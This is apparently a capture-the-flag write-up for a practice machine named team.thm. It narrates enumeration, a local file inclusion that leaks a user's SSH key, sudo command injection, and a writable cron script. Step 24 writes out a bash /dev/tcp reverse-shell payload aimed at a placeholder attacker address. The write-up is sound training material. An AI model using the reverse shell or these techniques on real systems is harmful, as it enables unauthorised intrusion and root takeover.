Initial Enumeration

1. I began with an Nmap scan, which revealed three open ports:

    FTP
    
    SSH
    
    HTTP (port 80)

<img width="764" height="346" alt="Scan" src="https://github.com/user-attachments/assets/7f83107e-f16c-4722-84a4-14aafaae24c9" />

2. I attempted to connect to the FTP service to check for anonymous access, but anonymous login was not permitted, so I moved on.

<img width="296" height="187" alt="image" src="https://github.com/user-attachments/assets/34b4b148-8d2d-4c5e-a354-06c7373206ab" />

3. Navigating to the HTTP service on port 80, I was greeted with the default Apache2 Ubuntu page. I ran Gobuster to enumerate directories, but this initial scan returned no useful results.

<img width="817" height="771" alt="image" src="https://github.com/user-attachments/assets/256dce31-ec99-476b-82de-9977ba4a496a" />

4. Inspecting the page source of the Apache default page revealed the following message:

    “If you see this add team.thm to your hosts!”

<img width="941" height="292" alt="image" src="https://github.com/user-attachments/assets/b5556bfa-cb78-4f9a-a650-4c57072c396d" />

5. I added team.thm to my local /etc/hosts file and reloaded the page.

Web Enumeration & Discovery

6. The new site didn’t immediately reveal anything useful, so I ran Gobuster again, this time targeting team.thm.

<img width="634" height="398" alt="image" src="https://github.com/user-attachments/assets/54b1b87e-6dea-4310-bc18-798ccc5d0fe6" />

7. This scan uncovered a robots.txt file.

8. I retrieved the file using a simple curl command, which returned the name:

    dale

<img width="287" height="55" alt="image" src="https://github.com/user-attachments/assets/2ad2c4ea-906e-45ad-8b7b-d560874aa6d8" />

9. I attempted to brute-force the FTP service using Hydra with the username dale, but this approach was unsuccessful.

Virtual Host & LFI Discovery

10. I performed virtual host enumeration using ffuf, which revealed a new subdomain:

    dev.team.thm

<img width="508" height="67" alt="image" src="https://github.com/user-attachments/assets/584889b8-d91d-40ee-be2c-c90d41407ccd" />

11. After adding this subdomain to /etc/hosts, I navigated to it and found a development site with a placeholder link labeled “team share”.

<img width="514" height="207" alt="image" src="https://github.com/user-attachments/assets/fe4cca0e-498d-42c2-8b74-e4b079f0f371" />

12. Clicking the link led to a plain page, but the URL stood out:

    script.php?page=teamshare.php

13. Suspecting a Local File Inclusion (LFI) vulnerability, I modified the page parameter and successfully read /etc/passwd.

14. From /etc/passwd, I confirmed the user dale and retrieved the user flag from:

    /home/dale/user.txt

Exploitation via LFI

15. Knowing the vulnerability was LFI-based, I used ffuf again to fuzz for sensitive files via the page parameter.

<img width="724" height="244" alt="image" src="https://github.com/user-attachments/assets/60878949-97f1-424a-bfa9-85fe5410bde6" />

16. One particularly valuable discovery was:

    /etc/ssh/sshd_config

17. I viewed the file in Burp Suite for easier inspection and discovered a private RSA key belonging to the user dale.

<img width="532" height="553" alt="image" src="https://github.com/user-attachments/assets/729cea5e-a9f9-4b4e-902d-60ae9315c524" />

18. I saved the key locally, fixed its permissions, and successfully SSH’d into the machine as dale.

Privilege Escalation – User to User

19. With the user flag obtained, my next goal was root access.

20. Running sudo -l as dale revealed:

    (gyles) NOPASSWD: /home/gyles/admin_checks

<img width="946" height="100" alt="image" src="https://github.com/user-attachments/assets/42fe2fec-bd48-4256-b5d1-a924cfbfa1b5" />

21. Reviewing the admin_checks script revealed a command injection opportunity involving:

    "$error 2>/dev/null"

<img width="473" height="293" alt="image" src="https://github.com/user-attachments/assets/dfa33ba8-0d5b-4e3b-bcca-7e43ef87fb16" />

22. I executed the script as gyles, injected /bin/bash, and successfully escalated privileges.

<img width="685" height="346" alt="image" src="https://github.com/user-attachments/assets/39c25ea1-7d4f-4b28-885c-64c9cdccaa93" />

Privilege Escalation – Cron Job to Root

23. As gyles, I reviewed .bash_history and found references to:

    /usr/local/bin/main_backup.sh

along with mentions of cron jobs.

<img width="348" height="140" alt="image" src="https://github.com/user-attachments/assets/b1233aad-153d-4e0c-a5d6-77a63b3eedfd" />

24. Since the script was writable, I injected the following reverse shell payload:

    bash -c "bash -i >& /dev/tcp/ATTACKER IP/ATTACKER PORT 0>&1"

25. I started a Netcat listener and waited for the cron job to execute.

26. A root shell was received, allowing me to retrieve the root flag.

<img width="647" height="170" alt="image" src="https://github.com/user-attachments/assets/378049a6-303e-472c-9f2e-df7668ae3778" />



